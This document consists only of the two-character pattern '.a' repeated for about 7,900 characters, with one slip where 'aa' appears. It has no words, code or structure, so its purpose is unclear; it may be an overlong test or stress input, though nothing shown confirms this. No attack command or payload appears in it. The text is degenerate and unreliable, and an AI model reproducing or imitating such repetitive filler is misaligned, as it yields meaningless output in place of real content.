.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.aa.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.